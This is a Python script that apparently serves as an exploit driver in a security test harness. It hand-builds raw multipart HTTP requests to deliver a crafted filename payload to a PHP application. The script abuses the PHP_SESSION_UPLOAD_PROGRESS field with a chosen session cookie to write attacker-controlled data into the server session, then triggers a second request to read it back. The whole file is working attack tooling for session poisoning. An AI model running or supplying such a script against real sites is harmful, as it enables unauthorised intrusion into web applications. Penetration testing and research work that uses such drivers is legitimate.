#!/usr/bin/env python3
"""Raw multipart driver for the Chain C harness.

curl's -F re-escapes quotes inside filenames, which corrupts the payload
(`\"` becomes `\\%22`). This sends the exact bytes the chain needs.

Usage: probe.py <base-url> <sid> <filename-payload>
"""
import socket
import sys
import urllib.parse

BOUNDARY = "CHAINCBOUNDARY"


def post(host, port, path, sid, filename):
    body = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n'
        f"Content-Type: text/plain\r\n\r\nZ\r\n"
        f"--{BOUNDARY}--\r\n"
    ).encode("latin-1")

    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    sock = socket.create_connection((host, port), timeout=20)
    sock.sendall(request)
    sock.settimeout(20)
    data = b""
    while True:
        try:
            chunk = sock.recv(65536)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    sock.close()
    return data.decode("latin-1", "replace")


def main() -> int:
    if len(sys.argv) < 4:
        print(__doc__, file=sys.stderr)
        return 2
    url, sid, payload = sys.argv[1], sys.argv[2], sys.argv[3]
    u = urllib.parse.urlparse(url)
    host, port = u.hostname, u.port or 80

    write = post(host, port, "/app/index.php", sid, payload)
    print("write: " + write.split("\r\n", 1)[0])
    read = post(host, port, "/api/index.php", sid, "dummy")
    print("read : " + read.split("\r\n", 1)[0])
    return 0


if __name__ == "__main__":
    sys.exit(main())
